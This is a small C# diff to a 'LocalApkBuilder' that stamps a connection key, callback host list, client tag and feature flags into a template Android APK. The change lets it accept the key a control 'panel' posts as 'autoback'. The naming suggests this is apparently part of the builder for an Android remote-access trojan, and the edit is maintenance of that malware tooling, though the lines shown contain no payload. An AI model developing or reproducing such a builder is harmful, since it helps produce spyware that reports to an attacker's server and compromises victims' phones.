@@ -69,7 +69,10 @@ public static class LocalApkBuilder
 	public static string Build(Dictionary<string, string> p, string templateApkPath, string outputDirectory)
 	{
 		// ---- 1. resolve parameters (same keys the remote builder used) ----
-		string connectionKey = Get(p, "conkey", RandomToken(16));
+		// The panel posts the connection-key field as "autoback" (ApkMaker.startbuilder).
+		string connectionKey = Get(p, "conkey", Get(p, "autoback", ""));
+		if (string.IsNullOrEmpty(connectionKey))
+			connectionKey = RandomToken(16);
 		string hostList = Get(p, "uhost", "127.0.0.1:8080");
 		string clientTag = Get(p, "Ctag", "default");
 		string allconf = Get(p, "allconf", "0|0[*]1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]0|0[*]1|1[*]0|0[*]0|0[*]0|0[*]0|0|0|0[*]0|0[*]0|0[*]0|0[*]1|1");
